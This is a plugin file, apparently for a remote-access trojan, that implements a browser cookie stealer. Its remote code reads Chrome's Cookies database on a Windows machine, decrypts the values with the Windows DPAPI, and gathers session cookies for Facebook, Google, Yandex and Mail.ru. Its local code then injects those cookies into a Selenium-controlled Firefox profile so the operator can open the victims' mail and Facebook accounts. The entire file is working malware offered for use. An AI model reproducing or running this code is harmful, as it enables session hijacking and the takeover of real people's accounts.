plugin_name = r"""cookieStealer"""
plugin_description = r"""Browser Cookies Stealer"""
r_source = r"""
import sqlite3
import win32crypt

urls = {
    '.facebook.com': ('datr', 'c_user', 'xs'),
    '.yandex.com': (),
    '.yandex.ru': (),
    '.mail.ru': (),
    '.google.com': (),
    'accounts.google.com': (),
}


# Chrome Stealer
PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
connection = sqlite3.connect(PathName)
sessions = []
with connection:
    cursor = connection.cursor()
    v = cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    values = v.fetchall()

    for info in values:
        if info[0] in urls:
            host = info[0]
            name = info[1]
            value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
            sessions.append({
                    'domain': host,
                    'name': name,
                    'value': value,
                })

mprint = sessions
"""
l_source = r"""
# Chrome Cookies Stealer

import ast
import threading

sessions = ast.literal_eval(mprint)

def chrome_sessions(sessions, client_id):
    from selenium import webdriver
    from selenium.webdriver.firefox.webdriver import FirefoxProfile
    from selenium.webdriver.common.keys import Keys
    import sys

    cookies = sessions

    urls = {
        u'.facebook.com': u'https://www.facebook.com',
        u'.mail.ru': u'https://e.mail.ru',
        u'.yandex.com': u'https://mail.yandex.com',
        u'.yandex.ru': u'https://mail.yandex.ru',
        u'.yandex.ru': u'https://mail.yandex.ru',
        u'.google.com': u'https://mail.google.com',
        u'accounts.google.com': u'https://mail.google.com',
    }

    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{}'.format(client_id))
    if not os.path.exists(path_to_profile):
        os.makedirs(path_to_profile)
    profile = FirefoxProfile(path_to_profile)
    driver_chrome = webdriver.Firefox(profile)

    l = []
    for dics in cookies:
        l.append(dics['domain'])
    domains = set(l)
    for domain in domains:
        driver_chrome.get(urls[domain])
        for cookie in cookies:
            if cookie['domain'] == domain:
                driver_chrome.add_cookie(cookie)
        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')

    for i in range(len(domains)+1):
        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + str(i))
        driver_chrome.refresh()

chrome_threading = threading.Thread(target=chrome_sessions, args=(sessions, client_id))
chrome_threading.start()
"""
